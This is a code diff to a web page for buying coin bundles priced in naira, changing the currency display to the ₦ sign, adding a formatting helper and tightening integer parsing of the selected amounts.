@@ -295,23 +295,23 @@ body {
   <div class="coins-grid" id="coinsGrid">
     <div class="coin-box" data-coins="30" onclick="selectBox(this)">
       <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">30</div>
-      <div class="coin-price">NGN530</div>
+      <div class="coin-price">₦530</div>
     </div>
     <div class="coin-box" data-coins="350" onclick="selectBox(this)">
       <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">350</div>
-      <div class="coin-price">NGN6,200</div>
+      <div class="coin-price">₦6,200</div>
     </div>
     <div class="coin-box" data-coins="700" onclick="selectBox(this)">
       <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">700</div>
-      <div class="coin-price">NGN12,400</div>
+      <div class="coin-price">₦12,400</div>
     </div>
     <div class="coin-box" data-coins="1400" onclick="selectBox(this)">
       <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">1,400</div>
-      <div class="coin-price">NGN24,700</div>
+      <div class="coin-price">₦24,700</div>
     </div>
     <div class="coin-box" data-coins="3500" onclick="selectBox(this)">
       <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">3,500</div>
-      <div class="coin-price">NGN61,600</div>
+      <div class="coin-price">₦61,985</div>
     </div>
     <div class="coin-box" data-coins="custom" onclick="selectCustom(this)">
       <span class="coin-amount">Custom</span>
@@ -358,14 +358,18 @@ body {
 </div>
 
 <script>
-let coinRate = 17.71; 
+let coinRate = 17.71;
 let selectedCoins = 30;
 let loggedIn = false;
+
+function formatCurrency(amount) {
+  return amount.toLocaleString('en-NG', { style: 'currency', currency: 'NGN' }).replace('NGN', '₦');
+}
 
 function selectBox(el) {
   document.querySelectorAll('.coin-box').forEach(b => b.classList.remove('active'));
   el.classList.add('active');
-  selectedCoins = el.getAttribute('data-coins');
+  selectedCoins = parseInt(el.getAttribute('data-coins')) || 0;
   document.getElementById("customInputBox").style.display = "none";
   updateButton();
 }
@@ -379,17 +383,17 @@ function selectCustom(el) {
 }
 
 function updateCustomAmount() {
-  const val = document.getElementById("customAmount").value;
-  selectedCoins = val ? parseInt(val) : 0;
+  const val = parseInt(document.getElementById("customAmount").value);
+  selectedCoins = val > 0 ? val : 0;
   updateButton();
 }
 
 function updateButton() {
   const btn = document.getElementById("mainButton");
-  const ngn = (selectedCoins * coinRate).toFixed(2);
   if (loggedIn) {
     if (selectedCoins > 0) {
-      btn.textContent = `Buy ${selectedCoins} Coins for NGN${ngn}`;
+      const ngn = formatCurrency(selectedCoins * coinRate);
+      btn.textContent = `Buy ${selectedCoins} Coins for ${ngn}`;
     } else {
       btn.textContent = "Buy Now";
     }
@@ -404,12 +408,12 @@ function startLogin() {
       document.getElementById("loginModal").style.display = "flex";
     }, 2000);
   } else {
-    const amount = (selectedCoins * coinRate).toFixed(2);
+    const amount = formatCurrency(selectedCoins * coinRate);
     document.body.innerHTML = `
       <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:Arial;text-align:center;">
         <h1 style="color:#ff375f;">LegalTenderPay Checkout</h1>
         <p style="font-size:18px;">You are buying <strong>${selectedCoins} Coins</strong></p>
-        <p style="font-size:20px;font-weight:bold;">Amount: NGN${amount}</p>
+        <p style="font-size:20px;font-weight:bold;">Amount: ${amount}</p>
         <p style="margin-top:30px;">Processing Secure Payment...</p>
       </div>`;
   }
